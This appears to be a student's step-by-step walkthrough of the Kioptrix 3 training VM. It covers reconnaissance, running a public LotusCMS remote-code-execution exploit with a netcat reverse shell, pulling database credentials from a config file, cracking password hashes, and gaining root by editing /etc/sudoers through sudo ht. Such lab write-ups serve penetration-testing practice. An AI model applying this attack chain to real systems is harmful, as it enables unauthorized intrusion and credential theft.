IMPORTANT:
Change target ip to Kioptrix3.com in dns(/etc/hosts I believe)

1.) Reconnaissance
  use arp-scan -l to find host
    should probably make a custom ping sweeper, but idfc rn
2.) Enumerate
  Run dirb/nmap/nikto to find system info
    Choosing not to run enum4linux, not sure if I'm using it right
  Since this is my 2nd run through of the box, I'm not reading the nikto
  nmap reveals ports 22, and 80 open, http has something called lotuscms with suhosin patch
  lotuscms is vuln, and suhosin is a security patch for php I believe.
3.) Explore website
  Login page under login, not susceptible to SQLi
  You can sqli into kioptrix3.com/phpmyadmin, but it doesn't do anything
4.) Remote Access
  On the login page, it says it's powered by lotuscms, which is vulnerable
    Because the suhosin patch, you have to go about it in a particular way
  Look up lotuscms rce exploit on google and enter the following command
    git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit
      After copying the exploit, cd into the directory and run
        ./lotusRCE.sh kioptrix3.com /
  On a separate window, run nc -nvlp 9000 to listen on the port
  On the exploit window, enter the local IP, the port, and choose an option that catches a shell on the nc
5.) Privilege Escalation
  Once in the shell, enter "find . -type f -iname *config*" to find a config file
  cat the ./gallery/gconfig.php to view the contents of the file and find the user: "root" and pw: "fuckeyou"
  enter the data into the phpmyadmin login to view the root php
  Browsing the dev_accounts field gives you the dreg and loneferret accounts and their hashed pw's
    gallarific users has an admin account
  Use hash-identifier to find what type of hash it is, and crackstation to crack the hash
  SSH into the system using loneferret, but add -oHostKeyAlgorithms=+ssh-rsa to generate a rsa Hostkey
  Use sudo -l to list available sudo commands
    Allowed to use sudo ht, which opens a text editor
      It'll fail, so type export TERM=xterm before, then sudo ht
  Once in the text editor, use F3 to open /etc/sudoers, then delete everything after : and write ALL
  whoami returns root
